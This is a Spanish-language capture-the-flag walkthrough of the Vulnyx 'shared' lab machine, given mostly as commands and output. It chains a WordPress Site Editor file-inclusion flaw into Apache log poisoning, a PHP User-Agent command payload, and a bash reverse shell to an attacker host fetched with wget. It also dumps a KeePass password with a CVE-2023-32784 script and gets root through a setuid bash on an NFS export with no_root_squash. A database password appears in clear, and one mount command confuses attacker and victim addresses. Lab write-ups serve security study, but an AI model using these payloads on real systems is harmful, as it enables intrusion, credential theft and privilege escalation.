Vulnyx
shared

arp-scan -I eth0 --localnet
•(IP-Victima) 08:00:27:59:4d:94 PCS Systemtechnik GmbH

nmap -p 22,80,111,2049,34459,40435,40643,40801,44385 -sS -sC -sV -n -Pn (IP-Victima) -oN nmap

•22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
•80/tcp open http Apache httpd 2.4.57 (Debian)
•111/tcp open rpcbind 2-4 (RPC #100000)
| 100005 1,2,3 40435/tcp mountd
| 100005 1,2,3 43823/udp mountd
| 100005 1,2,3 45977/udp6 mountd
| 100005 1,2,3 47159/tcp6 mountd
•2049/tcp open nfs_acl 3 (RPC #100227)
•34459/tcp open nlockmgr 1-4 (RPC #100021)
•40435/tcp open mountd 1-3 (RPC #100005)
•40643/tcp open mountd 1-3 (RPC #100005)
•40801/tcp open mountd 1-3 (RPC #100005)
•44385/tcp open status 1 (RPC #100024)

Vemos dentro del puerto 111 varias monturas, ahora vemos el interior de las monturas

showmount -e (IP-Victima)

•/shared/j4ckie *
•/shared/tmp *
•/shared/condor *

Ahora tenemos que ver el interior de las monturas, antes de comenzar creamos una carpeta para cada montura (/j4ckie, /condor y /tmp)

mount (IP-Victima):/shared/j4ckie /j4ckie
•suscribe.txt ((https://www.youtube.com/@jackie0x17))

mount (IP-Victima):/shared/condor /condor
•suscribe.txt ((https://www.youtube.com/@condor0777))

mount (IP-Victima):/shared/tmp /tmp
((vacio))

Bueno, esto nos lleva a los canales de los creadores de la máquina (suscribirse es necesario para terminar la máquina)

Ahora vamos a ir por el puerto 80. Ingresando a la página web de esta IP, vemos un servidor Apache sin más. Ahora haremos fuzzing

fuzzing

wfuzz --hc=404 -u http://(IP-Victima)/FUZZ -w /usr/share/dirb/wordlists/big.txt
•/wordpress

Al colocar "http://(IP-Victima)/wordpress" nos redirige a "http://shared.nyx/wordpress/". Por lo tanto, toca asociar el dominio con la IP en /etc/hosts

nano /etc/hosts

•https://www.youtube.com/watch?v=2F0opm-O_G4 shared.nyx

Y ya al ingresar, encontramos el WordPress. Cuando encontramos un WordPress, toca buscar usuarios, plugins, versión y rutas por defecto. Para esto es bueno WP-scan

wpscan --url http://shared.nyx/wordpress --enumerate p,u

Versión:
[+] WordPress version 6.4.2 identified (Insecure, released on 2023-12-06).

Plugins:
[+] site-editor | Location: http://shared.nyx/wordpress/wp-content/plugins/site-editor/ | Latest Version: 1.1.1 (up to date) | Last Updated: 2017-05-02T23:34:00.000Z

Users:
[+] admin

Y con wfuzz buscamos rutas por defecto

wfuzz --hc=404 -u http://shared.nyx/wordpress/FUZZ -w /usr/share/dirb/wordlists/big.txt
•/backups ((bloqueado))
•/wp-admin ((login de WordPress))
•/wp-content ((en blanco y se fuzzed hasta llegar a donde ya encontramos bloqueo))
•/wp-includes ((bloqueado))

Ahora vamos a ver si encontramos vulnerabilidades en los plugins. Uno que fue actualizado por última vez en 2017 suena a que va a ser vulnerable.

Investigando, encontramos en exploit-db hay un post donde nos da una ruta para ejecutar local file inclusion, atacando a "etc/passwd"

https://www.exploit-db.com/exploits/44340

Al colocar el exploit en el navegador, damos con que sí, hay un local file inclusion.

http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

Lo que podemos sacar de "/etc/passwd" es que tenemos una base de datos MySQL y tres usuarios además de root y www-data

•j4ckie
•condor
•jackondor

Luego de descubrir que tenemos path traversal, seguimos investigando y damos con la siguiente página, la cual nos indica que vía una ruta determinada "/var/log/apache2/access.log" podemos hacer ejecución remota de comandos.

**Este ataque es conocido como "log poisoning"**

https://wpscan.com/vulnerability/78575072-4e04-4a8a-baec-f313cfffe829/

**Aquí nos dan más opciones, incluido Burp Suite**

https://dheerajdeshmukh.medium.com/get-reverse-shell-through-log-poisoning-with-the-vulnerability-of-lfi-local-file-inclusion-e504e2d41f69

Al introducir la ruta "http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log", vemos que nos da la siguiente respuesta:

•{"success":true,"data":{"output":[]}}

Esto nos indica que es vulnerable a log poisoning. Ahora, mediante curl vamos a intentar ejecutar comandos al servidor. Hemos encontrado una página que nos da los siguientes pasos:

curl -i -v "http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log" -A "<?php system('whoami'); ?>"

**Página**

https://systemweakness.com/log-poisoning-to-remote-code-execution-lfi-curl-7c49be11956

Contenido utilizado

Command: curl -i -v {URL} -A "<?php system('ls /'); ?>"-i include response -v verbose -A To provide the value of User-Agent

Esto nos permite ejecutar comandos, dado que al colocar "whoami" nos responde •[02/Feb/2024:17:03:52 +0100] "GET / HTTP/1.1" 200 10956 "-" "www-data"

Bueno, ahora toca ganar acceso a la máquina vía una reverseshell apuntada a la bash.

Primero, creamos un archivo en nuestra máquina llamado "rev.php" con la siguiente reverseshell en su interior

bash -i >& /dev/tcp/(IP-Atacante)/443 0>&1

Ahora creamos un servidor con Python para poder uploadeoar la reverseshell

python3 -m http.server 8000

Ahora toca uploadeoar la reverseshell

curl -i -v "http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log" -A "<?php system('wget http://(IP-Atacante):8000/rev.php'); ?>"

Ya una vez subida, toca ejecutarla. Primero nos ponemos en escucha con Netcat y luego ejecutamos

nc -nlvp 443

curl -i -v "http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log" -A "<?php system('bash rev.php'); ?>"

Y ya obtenemos una reverseshell como "www-data"

Ahora hacemos el tratamiento de la TTY para estar más cómodos

script /dev/null -c bash
control+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash

Bueno, ahora a buscar. Una buena ruta para encontrar información delicada en WordPress es "wp-config.php"

cat wp-config.php

•define( 'DB_NAME', 'wordpress' );
•define( 'DB_USER', 'wordpress' );
•define( 'DB_PASSWORD', 'R9o17ONkbFk2BrRHG7zY' );

mysql -u wordpress -p
Password:R******************Y

SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+

SHOW tables FROM wordpress;

+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

USE wordpress;

SELECT * FROM wp_users;

| ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name |

| 1 | admin | $******************************/ | admin | shared.local@hacking.com | http://192.168.1.48/wordpress | 2024-01-22 10:08:32 | | 0 | admin |

Encontramos

•user_login: admin
•user_pass: $********************************/

Bueno, luego de conseguir ese user y ese pass, descubrimos que no existe lugar útil donde utilizarlo, por lo tanto seguimos buscando. Entre todos los archivos, encontramos un ".zip" que puede interesarnos

find / -name "*zip" 2>/dev/null
•/var/www/html/wordpress/backups/cp-sharedbbdd.zip

Descargamos ese archivo, mediante un servidor y Python

cd /var/www/html/wordpress/backups/cp-sharedbbdd.zip

python3 -m http.server 5000
**el puerto 5000 nos exime de permisos**

Y descargamos en nuestra máquina

wget (IP-Victima):5000/cp-sharedbbdd.zip

Una vez en nuestra máquina lo descomprimimos

unzip cp-sharedbbdd.zip
•KeePass.DMP
•sharedbbdd.kdbx

Vemos que tenemos un KeePass. Probamos con John the Ripper pero no obtuvimos respuesta. Investigando, damos con un script donde podemos dumpar el password (CVE-2023-32784).

https://github.com/dawnl3ss/CVE-2023-32784

Un script en Python el cual nos ayudará a conseguir la contraseña

python3 poc.py keepass.DMP
•●*********%

**La primera letra no la identifica, deducimos que es "s*********%" o "S*********%"**

Ingresamos al KeePass y encontramos las siguientes pass correspondientes a cada user

•condor: 	O******************I
•j4ckie: 	p******************8
•jackondor: 	7******************9

Ingresamos vía SSH con cada usuario y pass, la que nos da resultados es "jackondor"

ssh jackondor@192.168.200.17
pass:7********************9

Y ya estamos dentro

whoami
jackondor

Bueno, luego de buscar con muchas opciones de binarios, privilegios y archivos que puedan tener alguna passwd para escalar privilegios, recordamos que esta máquina tiene monturas, en las cuales nosotros podríamos manipular desde nuestra máquina atacante. Por lo tanto, podemos ver la carpeta "exports" donde se alojan las configuraciones de exportación

cat export

•/hared/condor *(rw,sync,no_subtree_check)
•/shared/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
•/shared/j4ckie *(rw,sync,no_subtree_check)

Aquí vemos qué permisos tienen las monturas que encontramos anteriormente. La montura "/tmp" es la que nos llama la atención

(rw,sync,insecure,no_root_squash,no_subtree_check): Son las opciones de montaje para el sistema de archivos compartido.

•rw: Permite lectura y escritura.
•sync: Los cambios en el sistema de archivos son escritos de manera sincrónica en el disco, lo que asegura que los datos estén escritos antes de que la llamada del sistema retorne.
•insecure: Permite a clientes NFS conectarse a puertos no privilegiados en el servidor. No es seguro, por lo que debería evitarse en entornos no confiables.
•no_root_squash: Permite al cliente NFS acceder a archivos como el usuario root en el servidor. Esto puede ser arriesgado en términos de seguridad.
•no_subtree_check: Desactiva la verificación del árbol de directorios, lo que significa que el servidor no verificará que el cliente tenga acceso a la totalidad del árbol exportado.

Ahora, toca relacionar la montura con nuestra máquina atacante, subir un archivo que nos permita ejecutar como root una bash

Primero vamos a nuestra máquina atacante

**Algunos comandos los hicimos antes, pero mejor repetir el proceso para no perderse**

showmount -e (IP-Victima)

•/shared/j4ckie *
•/shared/tmp *
•/shared/condor *

mkdir /monturas/tmp
cd /monturas/tmp

mount -t nfs (IP-Atacante):/home/kali/vulnyx/shared/tmp /tmp/shared/tmp

****

df -h
**Con esto verificamos que se haya creado exitosamente**
•(IP-Victima):/shared/tmp 19G 2.7G 15G 16% /home/kali/vulnyx/shared/monturas/tmp

Ahora crearemos el archivo que nos dará la bash y le daremos permisos de ejecución

cd /home/kali/vulnyx/shared/monturas/tmp

cp /bin/bash .

chmod +s bash

Ahora, si todo salió bien, en la máquina víctima deberíamos haber creado a la par el mismo archivo. Ingresamos a la máquina víctima, a la carpeta donde se debería haber alojado la montura y ejecutamos la bash

cd /shared/tmp

ls
•bash

./bash -p

bash-5.2# whoami
root

Ya somos root (:D)
